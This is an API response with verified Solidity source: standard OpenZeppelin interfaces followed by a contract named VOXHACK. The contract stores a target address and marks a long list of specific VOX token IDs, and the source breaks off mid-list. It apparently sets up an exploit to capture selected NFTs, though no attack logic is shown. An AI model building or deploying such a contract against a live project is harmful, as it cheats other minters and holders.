{"status":"1","message":"OK","result":[{"SourceCode":"// File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.0 (token/ERC721/IERC721Receiver.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @title ERC721 token receiver interface\r\n * @dev Interface for any contract that wants to support safeTransfers\r\n * from ERC721 asset contracts.\r\n */\r\ninterface IERC721Receiver {\r\n    /**\r\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\r\n     * by `operator` from `from`, this function is called.\r\n     *\r\n     * It must return its Solidity selector to confirm the token transfer.\r\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\r\n     *\r\n     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.\r\n     */\r\n    function onERC721Received(\r\n        address operator,\r\n        address from,\r\n        uint256 tokenId,\r\n        bytes calldata data\r\n    ) external returns (bytes4);\r\n}\r\n\r\n// File: @openzeppelin/contracts/utils/introspection/IERC165.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.0 (utils/introspection/IERC165.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Interface of the ERC165 standard, as defined in the\r\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\r\n *\r\n * Implementers can declare support of contract interfaces, which can then be\r\n * queried by others ({ERC165Checker}).\r\n *\r\n * For an implementation, see {ERC165}.\r\n */\r\ninterface IERC165 {\r\n    /**\r\n     * @dev Returns true if this contract implements the interface defined by\r\n     * `interfaceId`. See the corresponding\r\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\r\n     * to learn more about how these ids are created.\r\n     *\r\n     * This function call must use less than 30 000 gas.\r\n     */\r\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC1155/IERC1155.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC1155/IERC1155.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n/**\r\n * @dev Required interface of an ERC1155 compliant contract, as defined in the\r\n * https://eips.ethereum.org/EIPS/eip-1155[EIP].\r\n *\r\n * _Available since v3.1._\r\n */\r\ninterface IERC1155 is IERC165 {\r\n    /**\r\n     * @dev Emitted when `value` tokens of token type `id` are transferred from `from` to `to` by `operator`.\r\n     */\r\n    event TransferSingle(address indexed operator, address indexed from, address indexed to, uint256 id, uint256 value);\r\n\r\n    /**\r\n     * @dev Equivalent to multiple {TransferSingle} events, where `operator`, `from` and `to` are the same for all\r\n     * transfers.\r\n     */\r\n    event TransferBatch(\r\n        address indexed operator,\r\n        address indexed from,\r\n        address indexed to,\r\n        uint256[] ids,\r\n        uint256[] values\r\n    );\r\n\r\n    /**\r\n     * @dev Emitted when `account` grants or revokes permission to `operator` to transfer their tokens, according to\r\n     * `approved`.\r\n     */\r\n    event ApprovalForAll(address indexed account, address indexed operator, bool approved);\r\n\r\n    /**\r\n     * @dev Emitted when the URI for token type `id` changes to `value`, if it is a non-programmatic URI.\r\n     *\r\n     * If an {URI} event was emitted for `id`, the standard\r\n     * https://eips.ethereum.org/EIPS/eip-1155#metadata-extensions[guarantees] that `value` will equal the value\r\n     * returned by {IERC1155MetadataURI-uri}.\r\n     */\r\n    event URI(string value, uint256 indexed id);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens of token type `id` owned by `account`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `account` cannot be the zero address.\r\n     */\r\n    function balanceOf(address account, uint256 id) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {balanceOf}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `accounts` and `ids` must have the same length.\r\n     */\r\n    function balanceOfBatch(address[] calldata accounts, uint256[] calldata ids)\r\n        external\r\n        view\r\n        returns (uint256[] memory);\r\n\r\n    /**\r\n     * @dev Grants or revokes permission to `operator` to transfer the caller's tokens, according to `approved`,\r\n     *\r\n     * Emits an {ApprovalForAll} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `operator` cannot be the caller.\r\n     */\r\n    function setApprovalForAll(address operator, bool approved) external;\r\n\r\n    /**\r\n     * @dev Returns true if `operator` is approved to transfer ``account``'s tokens.\r\n     *\r\n     * See {setApprovalForAll}.\r\n     */\r\n    function isApprovedForAll(address account, address operator) external view returns (bool);\r\n\r\n    /**\r\n     * @dev Transfers `amount` tokens of token type `id` from `from` to `to`.\r\n     *\r\n     * Emits a {TransferSingle} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - If the caller is not `from`, it must be have been approved to spend ``from``'s tokens via {setApprovalForAll}.\r\n     * - `from` must have a balance of tokens of type `id` of at least `amount`.\r\n     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155Received} and return the\r\n     * acceptance magic value.\r\n     */\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 id,\r\n        uint256 amount,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    /**\r\n     * @dev xref:ROOT:erc1155.adoc#batch-operations[Batched] version of {safeTransferFrom}.\r\n     *\r\n     * Emits a {TransferBatch} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `ids` and `amounts` must have the same length.\r\n     * - If `to` refers to a smart contract, it must implement {IERC1155Receiver-onERC1155BatchReceived} and return the\r\n     * acceptance magic value.\r\n     */\r\n    function safeBatchTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256[] calldata ids,\r\n        uint256[] calldata amounts,\r\n        bytes calldata data\r\n    ) external;\r\n}\r\n\r\n// File: @openzeppelin/contracts/token/ERC721/IERC721.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.0 (token/ERC721/IERC721.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n/**\r\n * @dev Required interface of an ERC721 compliant contract.\r\n */\r\ninterface IERC721 is IERC165 {\r\n    /**\r\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\r\n\r\n    /**\r\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\r\n     */\r\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\r\n\r\n    /**\r\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\r\n     */\r\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\r\n\r\n    /**\r\n     * @dev Returns the number of tokens in ``owner``'s account.\r\n     */\r\n    function balanceOf(address owner) external view returns (uint256 balance);\r\n\r\n    /**\r\n     * @dev Returns the owner of the `tokenId` token.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `tokenId` must exist.\r\n     */\r\n    function ownerOf(uint256 tokenId) external view returns (address owner);\r\n\r\n    /**\r\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\r\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `tokenId` token must exist and be owned by `from`.\r\n     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.\r\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokenId\r\n    ) external;\r\n\r\n    /**\r\n     * @dev Transfers `tokenId` token from `from` to `to`.\r\n     *\r\n     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `tokenId` token must be owned by `from`.\r\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokenId\r\n    ) external;\r\n\r\n    /**\r\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\r\n     * The approval is cleared when the token is transferred.\r\n     *\r\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The caller must own the token or be an approved operator.\r\n     * - `tokenId` must exist.\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address to, uint256 tokenId) external;\r\n\r\n    /**\r\n     * @dev Returns the account approved for `tokenId` token.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `tokenId` must exist.\r\n     */\r\n    function getApproved(uint256 tokenId) external view returns (address operator);\r\n\r\n    /**\r\n     * @dev Approve or remove `operator` as an operator for the caller.\r\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The `operator` cannot be the caller.\r\n     *\r\n     * Emits an {ApprovalForAll} event.\r\n     */\r\n    function setApprovalForAll(address operator, bool _approved) external;\r\n\r\n    /**\r\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\r\n     *\r\n     * See {setApprovalForAll}\r\n     */\r\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\r\n\r\n    /**\r\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` cannot be the zero address.\r\n     * - `to` cannot be the zero address.\r\n     * - `tokenId` token must exist and be owned by `from`.\r\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\r\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function safeTransferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 tokenId,\r\n        bytes calldata data\r\n    ) external;\r\n}\r\n\r\n// File: @openzeppelin/contracts/utils/Context.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n// File: @openzeppelin/contracts/access/Ownable.sol\r\n\r\n\r\n// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract. This\r\n * can later be changed with {transferOwnership}.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    /**\r\n     * @dev Leaves the contract without owner. It will not be possible to call\r\n     * `onlyOwner` functions anymore. Can only be called by the current owner.\r\n     *\r\n     * NOTE: Renouncing ownership will leave the contract without an owner,\r\n     * thereby removing any functionality that is only available to the owner.\r\n     */\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Can only be called by the current owner.\r\n     */\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    /**\r\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\r\n     * Internal function without access restriction.\r\n     */\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n// File: contracts/vox.sol\r\n\r\n\r\npragma solidity ^0.8.0;\r\n\r\n\r\n\r\n\r\n\r\ncontract VOXHACK is Ownable, IERC721Receiver {\r\n    mapping(uint256 => bool) internal voxIds;\r\n    address target;\r\n    constructor(address addr) {\r\n        target = addr;\r\n        voxIds[141] = true;\r\nvoxIds[68] = true;\r\nvoxIds[74] = true;\r\nvoxIds[248] = true;\r\nvoxIds[298] = true;\r\nvoxIds[329] = true;\r\nvoxIds[562] = true;\r\nvoxIds[669] = true;\r\nvoxIds[860] = true;\r\nvoxIds[865] = true;\r\nvoxIds[967] = true;\r\nvoxIds[1052] = true;\r\nvoxIds[1092] = true;\r\nvoxIds[1151] = true;\r\nvoxIds[1294] = true;\r\nvoxIds[1328] = true;\r\nvoxIds[1539] = true;\r\nvoxIds[1579] = true;\r\nvoxIds[1631] = true;\r\nvoxIds[1819] = true;\r\nvoxIds[1835] = true;\r\nvoxIds[1976] = true;\r\nvoxIds[2226] = true;\r\nvoxIds[2471] = true;\r\nvoxIds[2741] = true;\r\nvoxIds[2982] = true;\r\nvoxIds[3035] = true;\r\nvoxIds[3110] = true;\r\nvoxIds[3225] = true;\r\nvoxIds[3235] = true;\r\nvoxIds[3324] = true;\r\nvoxIds[3589] = true;\r\nvoxIds[3668] = true;\r\nvoxIds[3757] = true;\r\nvoxIds[3817] = true;\r\nvoxIds[3871] = true;\r\nvoxIds[3915] = true;\r\nvoxIds[3969] = true;\r\nvoxIds[4357] = true;\r\nvoxIds[4563] = true;\r\nvoxIds[4594] = true;\r\nvoxIds[4740] = true;\r\nvoxIds[4778] = true;\r\nvoxIds[4874] = true;\r\nvoxIds[5041] = true;\r\nvoxIds[5352] = true;\r\nvoxIds[5419] = true;\r\nvoxIds[5460] = true;\r\nvoxIds[5476] = true;\r\nvoxIds[5799] = true;\r\nvoxIds[6072] = true;\r\nvoxIds[6416] = true;\r\nvoxIds[6472] = true;\r\nvoxIds[6507] = true;\r\nvoxIds[6566] = true;\r\nvoxIds[6618] = true;\r\nvoxIds[6637] = true;\r\nvoxIds[6638] = true;\r\nvoxIds[6810] = true;\r\nvoxIds[7007] = true;\r\nvoxIds[141] = true;\r\nvoxIds[185] = true;\r\nvoxIds[205] = true;\r\nvoxIds[231] = true;\r\nvoxIds[343] = true;\r\nvoxIds[549] = true;\r\nvoxIds[560] = true;\r\nvoxIds[612] = true;\r\nvoxIds[694] = true;\r\nvoxIds[825] = true;\r\nvoxIds[969] = true;\r\nvoxIds[979] = true;\r\nvoxIds[1022] = true;\r\nvoxIds[1100] = true;\r\nvoxIds[1136] = true;\r\nvoxIds[1166] = true;\r\nvoxIds[1202] = true;\r\nvoxIds[1464] = true;\r\nvoxIds[1752] = true;\r\nvoxIds[1817] = true;\r\nvoxIds[1957] = true;\r\nvoxIds[2294] = true;\r\nvoxIds[2383] = true;\r\nvoxIds[2593] = true;\r\nvoxIds[3071] = true;\r\nvoxIds[3321] = true;\r\nvoxIds[3325] = true;\r\nvoxIds[3395] = true;\r\nvoxIds[3498] = true;\r\nvoxIds[3720] = true;\r\nvoxIds[3811] = true;\r\nvoxIds[3992] = true;\r\nvoxIds[4008] = true;\r\nvoxIds[4075] = true;\r\nvoxIds[4151] = true;\r\nvoxIds[4202] = true;\r\nvoxIds[4393] = true;\r\nvoxIds[4463] = true;\r\nvoxIds[4805] = true;\r\nvoxIds[4847] = true;\r\nvoxIds[5019] = true;\r\nvoxIds[5131] = true;\r\nvoxIds[5186] = true;\r\nvoxIds[5190] = true;\r\nvoxIds[5215] = true;\r\nvoxIds[5371] = true;\r\nvoxIds[5379] = true;\r\nvoxIds[5425] = true;\r\nvoxIds[5590] = true;\r\nvoxIds[5763] = true;\r\nvoxIds[6003] = true;\r\nvoxIds[6025] = true;\r\nvoxIds[6158] = true;\r\nvoxIds[6268] = true;\r\nvoxIds[6344] = true;\r\nvoxIds[6577] = true;\r\nvoxIds[6610] = true;\r\nvoxIds[6769] = true;\r\nvoxIds[6776] = true;\r\nvoxIds[6893] = true;\r\nvoxIds[7013] = true;\r\nvoxIds[7136] = true;\r\nvoxIds[7254] = true;\r\nvoxIds[7313] = true;\r\nvoxIds[7323] = true;\r\nvoxIds[7495] = true;\r\nvoxIds[7705] = true;\r\nvoxIds[7725] = true;\r\nvoxIds[7895] = true;\r\nvoxIds[7931] = true;\r\nvoxIds[8098] = true;\r\nvoxIds[8233] = true;\r\nvoxIds[8537] = true;\r\nvoxIds[8644] = true;\r\nvoxIds[8712] = true;\r\nvoxIds[22] = true;\r\nvoxIds[33] = true;\r\nvoxIds[63] = true;\r\nvoxIds[84] = true;\r\nvoxIds[93] = true;\r\nvoxIds[100] = true;\r\nvoxIds[110] = true;\r\nvoxIds[128] = true;\r\nvoxIds[132] = true;\r\nvoxIds[142] = true;\r\nvoxIds[161] = true;\r\nvoxIds[162] = true;\r\nvoxIds[175] = true;\r\nvoxIds[177] = true;\r\nvoxIds[224] = true;\r\nvoxIds[233] = true;\r\nvoxIds[247] = true;\r\nvoxIds[255] = true;\r\nvoxIds[260] = true;\r\nvoxIds[263] = true;\r\nvoxIds[268] = true;\r\nvoxIds[271] = true;\r\nvoxIds[282] = true;\r\nvoxIds[289] = true;\r\nvoxIds[304] = true;\r\nvoxIds[310] = true;\r\nvoxIds[322] = true;\r\nvoxIds[333] = true;\r\nvoxIds[337] = true;\r\nvoxIds[346] = true;\r\nvoxIds[380] = true;\r\nvoxIds[403] = true;\r\nvoxIds[421] = true;\r\nvoxIds[445] = true;\r\nvoxIds[456] = true;\r\nvoxIds[469] = true;\r\nvoxIds[556] = true;\r\nvoxIds[586] = true;\r\nvoxIds[602] = true;\r\nvoxIds[606] = true;\r\nvoxIds[654] = true;\r\nvoxIds[684] = true;\r\nvoxIds[704] = true;\r\nvoxIds[772] = true;\r\nvoxIds[776] = true;\r\nvoxIds[801] = true;\r\nvoxIds[828] = true;\r\nvoxIds[829] = true;\r\nvoxIds[834] = true;\r\nvoxIds[844] = true;\r\nvoxIds[852] = true;\r\nvoxIds[855] = true;\r\nvoxIds[856] = true;\r\nvoxIds[880] = true;\r\nvoxIds[899] = true;\r\nvoxIds[900] = true;\r\nvoxIds[907] = true;\r\nvoxIds[919] = true;\r\nvoxIds[956] = true;\r\nvoxIds[988] = true;\r\nvoxIds[1008] = true;\r\nvoxIds[1014] = true;\r\nvoxIds[1024] = true;\r\nvoxIds[1059] = true;\r\nvoxIds[1075] = true;\r\nvoxIds[1102] = true;\r\nvoxIds[1117] = true;\r\nvoxIds[1121] = true;\r\nvoxIds[1127] = true;\r\nvoxIds[1129] = true;\r\nvoxIds[1139] = true;\r\nvoxIds[1165] = true;\r\nvoxIds[1169] = true;\r\nvoxIds[1195] = true;\r\nvoxIds[1196] = true;\r\nvoxIds[1206] = true;\r\nvoxIds[1207] = true;\r\nvoxIds[1213] = true;\r\nvoxIds[1280] = true;\r\nvoxIds[1348] = true;\r\nvoxIds[1394] = true;\r\nvoxIds[1423] = true;\r\nvoxIds[1430] = true;\r\nvoxIds[1436] = true;\r\nvoxIds[1454] = true;\r\nvoxIds[1480] = true;\r\nvoxIds[1494] = true;\r\nvoxIds[1511] = true;\r\nvoxIds[1538] = true;\r\nvoxIds[1549] = true;\r\nvoxIds[1559] = true;\r\nvoxIds[1586] = true;\r\nvoxIds[1593] = true;\r\nvoxIds[1720] = true;\r\nvoxIds[1753] = true;\r\nvoxIds[1769] = true;\r\nvoxIds[1782] = true;\r\nvoxIds[1787] = true;\r\nvoxIds[1801] = true;\r\nvoxIds[1826] = true;\r\nvoxIds[1831] = true;\r\nvoxIds[1839] = true;\r\nvoxIds[1847] = true;\r\nvoxIds[1864] = true;\r\nvoxIds[1899] = true;\r\nvoxIds[1911] = true;\r\nvoxIds[2016] = true;\r\nvoxIds[2056] = true;\r\nvoxIds[2069] = true;\r\nvoxIds[2117] = true;\r\nvoxIds[2154] = true;\r\nvoxIds[2158] = true;\r\nvoxIds[2193] = true;\r\nvoxIds[2199] = true;\r\nvoxIds[2205] = true;\r\nvoxIds[2206] = true;\r\nvoxIds[2248] = true;\r\nvoxIds[2277] = true;\r\nvoxIds[2301] = true;\r\nvoxIds[2318] = true;\r\nvoxIds[2326] = true;\r\nvoxIds[2336] = true;\r\nvoxIds[2342] = true;\r\nvoxIds[2361] = true;\r\nvoxIds[2362] = true;\r\nvoxIds[2414] = true;\r\nvoxIds[2461] = true;\r\nvoxIds[2514] = true;\r\nvoxIds[2519] = true;\r\nvoxIds[2521] = true;\r\nvoxIds[2527] = true;\r\nvoxIds[2558] = true;\r\nvoxIds[2575] = true;\r\nvoxIds[2577] = true;\r\nvoxIds[2612] = true;\r\nvoxIds[2623] = true;\r\nvoxIds[2629] = true;\r\nvoxIds[2637] = true;\r\nvoxIds[2641] = true;\r\nvoxIds[2660] = true;\r\nvoxIds[2664] = true;\r\nvoxIds[2693] = true;\r\nvoxIds[2731] = true;\r\nvoxIds[2738] = true;\r\nvoxIds[2755] = true;\r\nvoxIds[2782] = true;\r\nvoxIds[2821] = true;\r\nvoxIds[2862] = true;\r\nvoxIds[2863] = true;\r\nvoxIds[2878] = true;\r\nvoxIds[2908] = true;\r\nvoxIds[2916] = true;\r\nvoxIds[2928] = true;\r\nvoxIds[2937] = true;\r\nvoxIds[2943] = true;\r\nvoxIds[2967] = true;\r\nvoxIds[3004] = true;\r\nvoxIds[3022] = true;\r\nvoxIds[3052] = true;\r\nvoxIds[3058] = true;\r\nvoxIds[3072] = true;\r\nvoxIds[3138] = true;\r\nvoxIds[3142] = true;\r\nvoxIds[3148] = true;\r\nvoxIds[3155] = true;\r\nvoxIds[3170] = true;\r\nvoxIds[3189] = true;\r\nvoxIds[3234] = true;\r\nvoxIds[3239] = true;\r\nvoxIds[3255] = true;\r\nvoxIds[3263] = true;\r\nvoxIds[3264] = true;\r\nvoxIds[3280] = true;\r\nvoxIds[3294] = true;\r\nvoxIds[3306] = true;\r\nvoxIds[3310] = true;\r\nvoxIds[3313] = true;\r\nvoxIds[3314] = true;\r\nvoxIds[3323] = true;\r\nvoxIds[3334] = true;\r\nvoxIds[3366] = true;\r\nvoxIds[3385] = true;\r\nvoxIds[3413] = true;\r\nvoxIds[3420] = true;\r\nvoxIds[3440] = true;\r\nvoxIds[3459] = true;\r\nvoxIds[3469] = true;\r\nvoxIds[3514] = true;\r\nvoxIds[3548] = true;\r\nvoxIds[3552] = true;\r\nvoxIds[3563] = true;\r\nvoxIds[3588] = true;\r\nvoxIds[3591] = true;\r\nvoxIds[3605] = true;\r\nvoxIds[3606] = true;\r\nvoxIds[3648] = true;\r\nvoxIds[3680] = true;\r\nvoxIds[3684] = true;\r\nvoxIds[3693] = true;\r\nvoxIds[3699] = true;\r\nvoxIds[3710] = true;\r\nvoxIds[3715] = true;\r\nvoxIds[3738] = true;\r\nvoxIds[3764] = true;\r\nvoxIds[3771] = true;\r\nvoxIds[3781] = true;\r\nvoxIds[3801] = true;\r\nvoxIds[3806] = true;\r\nvoxIds[3827] = true;\r\nvoxIds[3840] = true;\r\nvoxIds[3865] = true;\r\nvoxIds[3876] = true;\r\nvoxIds[3881] = true;\r\nvoxIds[3889] = true;\r\nvoxIds[3893] = true;\r\nvoxIds[3931] = true;\r\nvoxIds[3942] = true;\r\nvoxIds[3964] = true;\r\nvoxIds[3968] = true;\r\nvoxIds[3994] = true;\r\nvoxIds[4022] = true;\r\nvoxIds[4026] = true;\r\nvoxIds[4054] = true;\r\nvoxIds[4073] = true;\r\nvoxIds[4136] = true;\r\nvoxIds[4192] = true;\r\nvoxIds[4198] = true;\r\nvoxIds[4208] = true;\r\nvoxIds[4263] = true;\r\nvoxIds[4269] = true;\r\nvoxIds[4287] = true;\r\nvoxIds[4306] = true;\r\nvoxIds[4311] = true;\r\nvoxIds[4314] = true;\r\nvoxIds[4332] = true;\r\nvoxIds[4380] = true;\r\nvoxIds[4397] = true;\r\nvoxIds[4399] = true;\r\nvoxIds[4445] = true;\r\nvoxIds[4457] = true;\r\nvoxIds[4512] = true;\r\nvoxIds[4555] = true;\r\nvoxIds[4558] = true;\r\nvoxIds[4621] = true;\r\nvoxIds[4660] = true;\r\nvoxIds[4687] = true;\r\nvoxIds[4692] = true;\r\nvoxIds[4695] = true;\r\nvoxIds[4739] = true;\r\nvoxIds[4774] = true;\r\nvoxIds[4780] = true;\r\nvoxIds[4824] = true;\r\nvoxIds[4828] = true;\r\nvoxIds[4835] = true;\r\nvoxIds[4881] = true;\r\nvoxIds[4947] = true;\r\nvoxIds[4986] = true;\r\nvoxIds[5001] = true;\r\nvoxIds[5014] = true;\r\nvoxIds[5023] = true;\r\nvoxIds[5274] = true;\r\nvoxIds[5287] = true;\r\nvoxIds[5292] = true;\r\nvoxIds[5309] = true;\r\nvoxIds[5332] = true;\r\nvoxIds[5346] = true;\r\nvoxIds[5348] = true;\r\nvoxIds[5360] = true;\r\nvoxIds[5383] = true;\r\nvoxIds[5384] = true;\r\nvoxIds[5389] = true;\r\nvoxIds[5391] = true;\r\nvoxIds[5399] = true;\r\nvoxIds[5402] = true;\r\nvoxIds[5416] = true;\r\nvoxIds[5436] = true;\r\nvoxIds[5444] = true;\r\nvoxIds[5478] = true;\r\nvoxIds[5519] = true;\r\nvoxIds[5537] = true;\r\nvoxIds[5540] = true;\r\nvoxIds[5028] = true;\r\nvoxIds[5050] = true;\r\nvoxIds[5062] = true;\r\nvoxIds[5077] = true;\r\nvoxIds[5093] = true;\r\nvoxIds[5100] = true;\r\nvoxIds[5141] = true;\r\nvoxIds[5156] = true;\r\nvoxIds[5211] = true;\r\nvoxIds[5213] = true;\r\nvoxIds[5221] = true;\r\nvoxIds[5223] = true;\r\nvoxIds[5230] = true;\r\nvoxIds[5234] = true;\r\nvoxIds[5257] = true;\r\nvoxIds[5595] = true;\r\nvoxIds[5652] = true;\r\nvoxIds[5659] = true;\r\nvoxIds[5678] = true;\r\nvoxIds[5685] = true;\r\nvoxIds[5687] = true;\r\nvoxIds[5720] = true;\r\nvoxIds[5729] = true;\r\nvoxIds[5739] = true;\r\nvoxIds[5748] = true;\r\nvoxIds[5770] = true;\r\nvoxIds[5805] = true;\r\nvoxIds[5822] = true;\r\nvoxIds[5825] = true;\r\nvoxIds[5876] = true;\r\nvoxIds[5898] = true;\r\nvoxIds[5935] = true;\r\nvoxIds[5945] = true;\r\nvoxIds[5949] = true;\r\nvoxIds[5976] = true;\r\nvoxIds[5992] = true;\r\nvoxIds[6008] = true;\r\nvoxIds[6010] = true;\r\nvoxIds[6017] = true;\r\nvoxIds[6035] = true;\r\nvoxIds[6040] = true;\r\nvoxIds[6061] = true;\r\nvoxIds[6068] = true;\r\nvoxIds[6144] = true;\r\nvoxIds[6164] = true;\r\nvoxIds[6184] = true;\r\nvoxIds[6196] = true;\r\nvoxIds[6271] = true;\r\nvoxIds[6314] = true;\r\nvoxIds[6318] = true;\r\nvoxIds[6323] = true;\r\nvoxIds[6337] = true;\r\nvoxIds[6362] = true;\r\nvoxIds[6389] = true;\r\nvoxIds[6391] = true;\r\nvoxIds[6420] = true;\r\nvoxIds[6422] = true;\r\nvoxIds[6431] = true;\r\nvoxIds[6501] = true;\r\nvoxIds[6529] = true;\r\nvoxIds[6538] = true;\r\nvoxIds[6559] = true;\r\nvoxIds[6576] = true;\r\nvoxIds[6586] = true;\r\nvoxIds[6591] = true;\r\nvoxIds[6633] = true;\r\nvoxIds[6646] = true;\r\nvoxIds[6648] = true;\r\nvoxIds[6650] = true;\r\nvoxIds[6675] = true;\r\nvoxIds[6677] = true;\r\nvoxIds[6707] = true;\r\nvoxIds[6723] = true;\r\nvoxIds[6777] = true;\r\nvoxIds[6786] = true;\r\nvoxIds[6787] = true;\r\nvoxIds[6812] = true;\r\nvoxIds[6825] = true;\r\nvoxIds[6844] = true;\r\nvoxIds[7012] = true;\r\nvoxIds[7020] = true;\r\nvoxIds[7034] = true;\r\nvoxIds[7050] = true;\r\nvoxIds[7057] = true;\r\nvoxIds[7073] = true;\r\nvoxIds[7116] = true;\r\nvoxIds[7133] = true;\r\nvoxIds[7155] = true;\r\nvoxIds[7216] = true;\r\nvoxIds[7277] = true;\r\nvoxIds[7302] = true;\r\nvoxIds[7335] = true;\r\nvoxIds[7344] = true;\r\nvoxIds[7374] = true;\r\nvoxIds[7375] = true;\r\nvoxIds[7412] = true;\r\nvoxIds[7416] = true;\r\nvoxIds[7426] = true;\r\nvoxIds[7438] = true;\r\nvoxIds[7440] = true;\r\nvoxIds[7453] = true;\r\nvoxIds[7457] = true;\r\nvoxIds[7464] = true;\r\nvoxIds[7470] = 